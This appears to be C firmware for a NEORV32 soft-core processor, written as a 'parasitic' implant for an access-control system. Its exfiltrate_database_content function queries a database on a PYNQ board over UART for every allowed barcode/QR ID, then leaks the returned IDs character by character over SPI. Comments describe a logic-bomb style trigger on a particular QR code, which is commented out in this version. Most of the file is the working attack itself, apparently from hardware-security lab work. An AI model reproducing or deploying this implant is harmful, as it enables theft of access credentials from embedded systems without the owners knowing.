
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
// #include <neorv32.h>

#define BAUD_RATE_0 19200

#define NEORV32_UART0_BASE 0xFFF50000U

// void wait_ms(uint32_t ms) {
//     uint64_t cycles_to_wait = ((uint64_t)100000000 / 1000) * ms;
//     uint64_t start = neorv32_cpu_get_cycle();
//     while ((neorv32_cpu_get_cycle() - start) < cycles_to_wait);
// }


// void neorv32_uart_gets(neorv32_uart_t *UARTx, char *buffer) {
//     int idx = 0;
//     char c;

//     // print_variable_address((uint32_t)buffer, "buffer");
//     while (1) {
//         while (!neorv32_uart_char_received(UARTx)) {
//             // wait for data
//         }
//         c = neorv32_uart_getc(UARTx);
//         if (c == '\n' || c == '\r') {
//             buffer[idx] = '\0';
//             break;
//         } else {
//             buffer[idx++] = c;
//         }
//     }
// }


void exfiltrate_database_content();


void main(void) {
    // TODO: see objdump to make sure this variable is got 
    // from the right place, even if it belongs to second/parasitic program
    static bool initialized = false;

    if (!initialized) {
        initialized = true;
        // check if SPI unit is implemented at all

        neorv32_rte_setup();

        neorv32_uart_setup(NEORV32_UART0_BASE, BAUD_RATE_0, 0);
        if (neorv32_spi_available() == 0) {
            // neorv32_uart0_printf("ERROR! No SPI unit implemented.");
            neorv32_uart_printf(NEORV32_UART0_BASE, "ERROR! No SPI unit implemented.\n");
            return;
        }

        // disable and reset SPI module
        neorv32_spi_disable();

        // hopefully this will set the SPI module to 5MHz (100MHz / prescaler )
        // (according to the formula in the "spi_setup" from the "demo_spi" example)
        //   uint32_t clock = neorv32_sysinfo_get_clk() / (2 * PRSC_LUT[spi_prsc] * (1 + clk_div));
        //   clk = 100MHz / (2 * 2 * (1 + 4)) = 100MHz / 20 = 5MHz
        int prescaler = 2;
        int clk_div = 4;
        // uint32_t spi_hz = neorv32_sysinfo_get_clk() / (prescaler * clk_div);
        int clk_polarity = 1; // high when idle
        int clk_phase = 0; // sample on rising edge
        neorv32_spi_setup(prescaler, clk_div, clk_phase, clk_polarity);                                                   
        // enable chip select (first channel)
        neorv32_spi_cs_en(0); // hardware design assumes there's only one SPI device anyway, this is not really needed
    }
    // check if it's possible to use the exfil function once
    // (will have to observe SPI pins in System ILA to check if it works,
    // or go to the lab with Esp/Arduino)

    // TODO: add debug probes, and resynthesise the design
    //       then check
    // // qrcode 123456 activates the attack (exfiltration of database content via SPI)
    // // equivalent of time-dependent logic-bomb
    // if (qrcode != 123456)
    //     return;
    exfiltrate_database_content();
    
    return 0;
}

//  void hooked_qrcode_check(uint32_t qrcode) {
//      exfiltrate_database_content();
//  }

void exfiltrate_database_content() {
    // neorv32_uart0_printf("SELECT * FROM allowed_barcode_IDs\n");
    neorv32_uart_printf(NEORV32_UART0_BASE, "SELECT * FROM allowed_barcode_IDs\n");
    wait_ms(500);
    // get response from SQL database on PYNQ
    char response[256];
    bool end_found = false;
    // expect replies containing all barcodes in the database
    while (!end_found) {
        uint64_t qr_num = 0;

        // neorv32_uart_gets(NEORV32_UART0, response);
        neorv32_uart_gets(NEORV32_UART0_BASE, response);

        int found_count = sscanf(response, "qr:%lld", &qr_num);
        if (!found_count) {
            // check if received string starts with "end"
            if (strncmp(response, "end", 3) == 0) {
                end_found = true;
            }
        } else {
            // send the received QR code number via SPI
            // character by character
            char qr_str[32];
            sprintf(qr_str, "%lld\n", qr_num);
            for (size_t i = 0; i < strlen(qr_str); i++) {
                char ret_val = neorv32_spi_transfer(qr_str[i]);
            }
        }
    }
}
                                                    